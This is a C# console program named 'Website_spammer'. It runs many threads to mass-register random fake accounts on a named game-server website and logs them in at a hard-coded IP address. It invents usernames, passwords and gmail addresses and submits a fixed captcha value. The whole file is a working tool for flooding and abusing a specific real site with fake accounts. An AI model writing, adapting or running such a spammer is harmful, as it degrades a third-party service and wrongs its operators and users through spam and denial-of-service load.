using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Website_spammer
{
    class Program
    {
        private static readonly HttpClient client = new HttpClient();
        public static Random rnd = new Random();
        static int success_login = 0, failed_login = 0, success_register = 0, failed_register = 0;
        static void Main(string[] args)
        {
            Console.Write("Enter the number of accounts to register/login: ");
            int count = int.Parse(Console.ReadLine());
            Console.Write("Enter the number of threads to work: ");
            int threads = int.Parse(Console.ReadLine());
            register(count, threads);
            //  login(count, threads);
            Console.ReadLine();
        }
        static void login_acc(string user, string pass)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create("http://185.38.148.15/");
                var postData = $"user={user}";
                postData += $"&pass={pass}";
                postData += $"&envio=1";

                var data = Encoding.ASCII.GetBytes(postData);

                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                var response = (HttpWebResponse)request.GetResponse();

                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                if (!responseString.Contains("No Character !"))
                {
                    failed_login++;
                    Console.WriteLine($"Failed to login.");
                }
                else
                {
                    success_login++;
                    Console.WriteLine($"Login user:{user} pass: {pass} on thread {Thread.CurrentThread.ManagedThreadId}.");
                }
                Console.Title = $"Reports {success_register} registered, {failed_register} failed - {success_login} logins, {failed_login} failed.";
            }
            catch
            {
                Console.WriteLine("[Login] Cannot reach server");
            }
        }
        static void login(int count, int threads)
        {
            for (int j = 0; j < threads; j++)
            {
                new Thread(() =>
                {
                    for (int i = 0; i < count; i++)
                    {
                        try
                        {
                            login_acc("test1234", "test1234");
                        }
                        catch
                        {
                            Console.WriteLine("[Login] Cannot reach server");
                        }
                    }

                    Console.WriteLine($"Reports {success_login} registered, {failed_login} failed.");
                    Console.WriteLine("DONE");
                }).Start();
            }
        }

        static void register(int count, int threads)
        {
            for (int j = 0; j < threads; j++)
            {
                new Thread(() =>
                {
                    for (int i = 0; i < count; i++)
                    {
                        try
                        {
                            string user = Guid.NewGuid().ToString("n").Substring(0, rnd.Next(4, 10)), pass = Guid.NewGuid().ToString("n").Substring(0, rnd.Next(4, 10));
                            var request = (HttpWebRequest)WebRequest.Create("http://topconquer.com/?page=register");
                            var postData = $"username={user}";
                            postData += $"&pass1={pass}";
                            postData += $"&email={Guid.NewGuid().ToString("n").Substring(0, rnd.Next(4, 10))}@gmail.com";
                            postData += $"&answer={Guid.NewGuid().ToString("n").Substring(0, rnd.Next(4, 10))}";
                            postData += "&question=What city were you born in?";
                            postData += "&rand=captcha";

                            var data = Encoding.ASCII.GetBytes(postData);

                            request.Method = "POST";
                            request.ContentType = "application/x-www-form-urlencoded";
                            request.ContentLength = data.Length;

                            using (var stream = request.GetRequestStream())
                            {
                                stream.Write(data, 0, data.Length);
                            }

                            var response = (HttpWebResponse)request.GetResponse();

                            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                            if (responseString.Contains("Account Already Exists"))
                            {
                                failed_register++;
                                Console.WriteLine($"user {user} already exists.");
                            }
                            else if (responseString.Contains("Account Created Successfully"))
                            {
                                success_register++;
                                Console.WriteLine($"user {user} pass {pass} registered on thread {Thread.CurrentThread.ManagedThreadId}.");
                                login_acc(user, pass);
                            }
                            else
                                Console.WriteLine("Unknown error.");
                            Console.Title = $"Reports {success_register} registered, {failed_register} failed - {success_login} logins, {failed_login} failed.";
                        }
                        catch
                        {
                            Console.WriteLine("[Register] Cannot reach server");
                        }
                    }

                    Console.WriteLine($"Reports {success_register} registered, {failed_register} failed.");
                    Console.WriteLine("DONE");
                }).Start();
            }
        }
    }
}
